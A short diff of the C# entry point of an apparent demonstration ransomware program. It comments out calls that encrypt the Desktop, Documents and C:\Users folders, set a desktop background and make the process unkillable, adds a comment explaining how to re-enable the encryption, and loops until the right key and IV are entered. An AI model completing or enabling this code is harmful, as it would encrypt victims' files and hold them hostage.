@@ -10,18 +10,24 @@
 
             //Utils.makeProcessUnkillable();
 
-            // Creates new encryptor class and and encrypt "special" directories e.g Desktop, Documents, etc
+            /* 
+             * Creates new encryptor class and and encrypt "special" directories e.g Desktop, Documents, etc
+             * Line below is commented out so running it doesn't encrypt your computer
+             * Uncomment it to see it function
+             */
             Encryptor encryptor = new Encryptor();
             // encryptor.EncryptSpecialDirectories();
 
             // Will recursively encrypt all files, currently throws a lot of errors
-
             //encryptor.EncryptDirectory(@"C:\Users");
 
             // Sets desktop background to specifc image
             //Utils.SetDesktopBackground(@"C:\Users\Programming\Desktop\Background.jpg");
 
-            // Starts decryption prcoess after key press
+            /* 
+             * Starts decryption prcoess after correct key and iv are entered
+             * Key and IV are saved to desktop in text file
+             */
             while (true)
             {
                 if (Utils.ValidateKeyAndIv(encryptor.key, encryptor.iv))
@@ -32,10 +38,6 @@
                     Environment.Exit(0);
                 }
             }
-
-
-            // decryptor.DecryptDirectory(@"C:\Users");
-
         }
     }
 }
